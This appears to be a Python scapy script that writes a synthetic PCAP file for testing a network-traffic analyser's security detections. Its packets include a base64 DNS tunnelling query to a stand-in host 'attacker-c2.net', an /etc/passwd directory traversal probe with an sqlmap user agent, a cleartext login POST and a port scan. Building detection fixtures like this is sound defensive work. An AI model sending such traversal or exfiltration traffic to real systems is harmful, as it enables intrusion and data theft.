import time
from pathlib import Path
from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, wrpcap
)

def generate_rich_sample_pcap(output_path: Path):
    """
    Generates a realistic multi-protocol PCAP containing:
    1. ARP / ICMP Ping request and replies
    2. Full TCP 3-Way Handshake (SYN, SYN-ACK, ACK)
    3. Plaintext HTTP POST with login credentials (for security detection testing)
    4. Plaintext HTTP GET with directory traversal probe (heuristic security finding)
    5. DNS Queries (normal and suspicious high-entropy/tunneling domain)
    6. Simulated TLS 1.3 Handshake (ClientHello with SNI api.example.com)
    7. Port scan pattern (multiple SYN packets to closed ports)
    8. UDP communication and data transfer
    """
    output_path.parent.mkdir(parents=True, exist_ok=True)
    packets = []
    base_time = time.time() - 300

    # 1. ICMP Ping Echo Request & Reply
    p1 = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
         IP(src="192.168.1.10", dst="8.8.8.8", id=1001, ttl=64) / \
         ICMP(type=8, code=0, id=1, seq=1) / Raw(load=b"TraceLens-Network-Probe-Ping-Data")
    p1.time = base_time + 0.01
    packets.append(p1)

    p2 = Ether(src="aa:bb:cc:dd:ee:ff", dst="00:11:22:33:44:55") / \
         IP(src="8.8.8.8", dst="192.168.1.10", id=2001, ttl=56) / \
         ICMP(type=0, code=0, id=1, seq=1) / Raw(load=b"TraceLens-Network-Probe-Ping-Data")
    p2.time = base_time + 0.03
    packets.append(p2)

    # 2. DNS Queries (A record for example.com and suspicious dga domain)
    dns_req1 = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
               IP(src="192.168.1.10", dst="192.168.1.1") / \
               UDP(sport=53412, dport=53) / \
               DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))
    dns_req1.time = base_time + 0.5
    packets.append(dns_req1)

    dns_resp1 = Ether(src="aa:bb:cc:dd:ee:ff", dst="00:11:22:33:44:55") / \
                IP(src="192.168.1.1", dst="192.168.1.10") / \
                UDP(sport=53, dport=53412) / \
                DNS(qr=1, aa=1, rd=1, qd=DNSQR(qname="example.com", qtype="A"),
                    an=DNSRR(rrname="example.com", rdata="93.184.216.34", ttl=300))
    dns_resp1.time = base_time + 0.54
    packets.append(dns_resp1)

    # Suspicious high entropy DNS tunneling query
    dns_tunnel = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
                 IP(src="192.168.1.10", dst="192.168.1.1") / \
                 UDP(sport=53413, dport=53) / \
                 DNS(rd=1, qd=DNSQR(qname="dGhpcy1pcy1hLXRlc3QtY3JlZGVudGlhbC1leGZpbHRyYXRpb24.tunnel.attacker-c2.net", qtype="TXT"))
    dns_tunnel.time = base_time + 1.2
    packets.append(dns_tunnel)

    # 3. HTTP Connection (TCP Handshake + POST with plain credentials)
    # SYN
    http_syn = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
               IP(src="192.168.1.10", dst="10.0.0.5") / \
               TCP(sport=49152, dport=80, flags="S", seq=10000)
    http_syn.time = base_time + 2.0
    packets.append(http_syn)

    # SYN-ACK
    http_synack = Ether(src="aa:bb:cc:dd:ee:ff", dst="00:11:22:33:44:55") / \
                  IP(src="10.0.0.5", dst="192.168.1.10") / \
                  TCP(sport=80, dport=49152, flags="SA", seq=20000, ack=10001)
    http_synack.time = base_time + 2.02
    packets.append(http_synack)

    # ACK
    http_ack = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
               IP(src="192.168.1.10", dst="10.0.0.5") / \
               TCP(sport=49152, dport=80, flags="A", seq=10001, ack=20001)
    http_ack.time = base_time + 2.03
    packets.append(http_ack)

    # HTTP POST with cleartext credentials (SECURITY ALERT)
    http_post_data = (
        b"POST /api/v1/auth/login HTTP/1.1\r\n"
        b"Host: 10.0.0.5\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 43\r\n"
        b"\r\n"
        b"username=admin&password=SuperSecretPassword123"
    )
    http_post = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
                IP(src="192.168.1.10", dst="10.0.0.5") / \
                TCP(sport=49152, dport=80, flags="PA", seq=10001, ack=20001) / \
                Raw(load=http_post_data)
    http_post.time = base_time + 2.08
    packets.append(http_post)

    # HTTP Server Response (200 OK with session cookie)
    http_resp_data = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx/1.24.0\r\n"
        b"Set-Cookie: session_id=987654321fedcba; Path=/; HttpOnly\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 35\r\n"
        b"\r\n"
        b'{"status":"success","user":"admin"}'
    )
    http_resp = Ether(src="aa:bb:cc:dd:ee:ff", dst="00:11:22:33:44:55") / \
                IP(src="10.0.0.5", dst="192.168.1.10") / \
                TCP(sport=80, dport=49152, flags="PA", seq=20001, ack=10001 + len(http_post_data)) / \
                Raw(load=http_resp_data)
    http_resp.time = base_time + 2.15
    packets.append(http_resp)

    # 4. HTTP Directory Traversal probe
    http_probe_data = (
        b"GET /download?file=../../../../etc/passwd HTTP/1.1\r\n"
        b"Host: 10.0.0.5\r\n"
        b"User-Agent: sqlmap/1.7.2#stable\r\n"
        b"\r\n"
    )
    http_probe = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
                 IP(src="192.168.1.10", dst="10.0.0.5") / \
                 TCP(sport=49153, dport=80, flags="PA", seq=50001, ack=1) / \
                 Raw(load=http_probe_data)
    http_probe.time = base_time + 3.0
    packets.append(http_probe)

    # 5. Simulated TLS 1.3 ClientHello (TCP Handshake + TLS Client Hello)
    tls_syn = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
              IP(src="192.168.1.10", dst="104.244.42.1") / \
              TCP(sport=51234, dport=443, flags="S", seq=30000)
    tls_syn.time = base_time + 4.0
    packets.append(tls_syn)

    tls_synack = Ether(src="aa:bb:cc:dd:ee:ff", dst="00:11:22:33:44:55") / \
                 IP(src="104.244.42.1", dst="192.168.1.10") / \
                 TCP(sport=443, dport=51234, flags="SA", seq=40000, ack=30001)
    tls_synack.time = base_time + 4.04
    packets.append(tls_synack)

    tls_ack = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
              IP(src="192.168.1.10", dst="104.244.42.1") / \
              TCP(sport=51234, dport=443, flags="A", seq=30001, ack=40001)
    tls_ack.time = base_time + 4.05
    packets.append(tls_ack)

    # TLS Client Hello with SNI api.example.com
    # Construct typical TLS Record (0x16 = Handshake, 0x0303 = TLS 1.2/1.3, Client Hello)
    sni_bytes = b"api.example.com"
    sni_ext = b"\x00\x00" + (len(sni_bytes) + 5).to_bytes(2, "big") + \
              (len(sni_bytes) + 3).to_bytes(2, "big") + b"\x00" + \
              len(sni_bytes).to_bytes(2, "big") + sni_bytes
    ch_body = b"\x03\x03" + (b"\xaa" * 32) + b"\x00" + b"\x00\x04\x13\x01\x13\x02" + b"\x01\x00" + \
              len(sni_ext).to_bytes(2, "big") + sni_ext
    ch_record = b"\x16\x03\x01" + (len(ch_body) + 4).to_bytes(2, "big") + \
                b"\x01" + len(ch_body).to_bytes(3, "big") + ch_body
    tls_client_hello = Ether(src="00:11:22:33:44:55", dst="aa:bb:cc:dd:ee:ff") / \
                       IP(src="192.168.1.10", dst="104.244.42.1") / \
                       TCP(sport=51234, dport=443, flags="PA", seq=30001, ack=40001) / \
                       Raw(load=ch_record)
    tls_client_hello.time = base_time + 4.10
    packets.append(tls_client_hello)

    # 6. TCP Port Scan from 192.168.1.88 targeting 192.168.1.10 across 10 ports
    scanner_ip = "192.168.1.88"
    target_ip = "192.168.1.10"
    ports_to_scan = [21, 22, 23, 25, 80, 135, 139, 445, 1433, 3389]
    for idx, p in enumerate(ports_to_scan):
        scan_pkt = Ether(src="00:55:44:33:22:11", dst="00:11:22:33:44:55") / \
                   IP(src=scanner_ip, dst=target_ip) / \
                   TCP(sport=50000 + idx, dport=p, flags="S", seq=50000 + idx)
        scan_pkt.time = base_time + 5.0 + (idx * 0.02)
        packets.append(scan_pkt)

    # Write PCAP
    wrpcap(str(output_path), packets)
    print(f"[+] Successfully generated sample PCAP with {len(packets)} packets at: {output_path}")

if __name__ == "__main__":
    out = Path(__file__).resolve().parent.parent.parent / "captures" / "sample_traffic.pcap"
    generate_rich_sample_pcap(out)
